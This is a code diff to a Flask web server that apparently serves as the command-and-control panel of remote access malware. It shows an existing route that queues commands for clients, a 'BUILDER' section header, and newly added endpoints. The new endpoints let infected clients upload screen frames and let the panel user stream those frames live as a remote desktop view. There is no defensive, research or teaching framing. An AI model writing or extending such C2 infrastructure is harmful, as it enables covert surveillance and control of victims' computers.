@@ -6,11 +6,17 @@ import zipfile
 import requests
 from datetime import datetime, timedelta
 from functools import wraps
-from flask import Flask, request, jsonify, send_from_directory, send_file, session
+import base64
+import threading
+from flask import Flask, request, jsonify, send_from_directory, send_file, session, Response
 from werkzeug.security import generate_password_hash, check_password_hash
 from werkzeug.utils import secure_filename
 
 app = Flask(__name__, static_folder='public')
+
+# In-memory frame storage for Remote Desktop
+rdp_frames = {}
+rdp_frames_lock = threading.Lock()
 
 # Paths setup
 BASE_DIR = os.path.abspath(os.path.dirname(__file__))
@@ -881,6 +887,54 @@ def c2_send_command():
         db.execute('UPDATE clients SET pending_command = ? WHERE client_id = ? AND user_id = ?', (command, client_id, user['id']))
         db.commit()
     return jsonify({'success': True})
+
+
+# ===== REMOTE DESKTOP FRAME ENDPOINTS =====
+
+@app.route('/api/c2/frame/<client_id>', methods=['POST'])
+def c2_upload_frame(client_id):
+    key = request.headers.get('x-panel-key', '')
+    if not key:
+        return jsonify({'error': 'unauthorized'}), 401
+    with get_db() as db:
+        user = db.execute('SELECT id FROM users WHERE api_key = ?', (key,)).fetchone()
+        if not user:
+            return jsonify({'error': 'unauthorized'}), 401
+
+    frame_data = request.get_data()
+    if not frame_data:
+        return jsonify({'error': 'empty frame'}), 400
+
+    with rdp_frames_lock:
+        rdp_frames[client_id] = {
+            'data': frame_data,
+            'ts': time.time()
+        }
+    return jsonify({'status': 'ok'})
+
+
+@app.route('/api/c2/stream/<client_id>')
+@login_required
+def c2_stream(client_id):
+    user = request.current_user
+    with get_db() as db:
+        client = db.execute('SELECT client_id FROM clients WHERE client_id = ? AND user_id = ?', (client_id, user['id'])).fetchone()
+        if not client:
+            return jsonify({'error': 'not found'}), 404
+
+    def generate():
+        last_ts = 0
+        while True:
+            with rdp_frames_lock:
+                frame = rdp_frames.get(client_id)
+            if frame and frame['ts'] > last_ts:
+                last_ts = frame['ts']
+                b64 = base64.b64encode(frame['data']).decode('ascii')
+                yield f"data:{b64}\n\n"
+            time.sleep(0.05)
+
+    return Response(generate(), mimetype='text/event-stream',
+                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})
 
 
 # ===== BUILDER =====
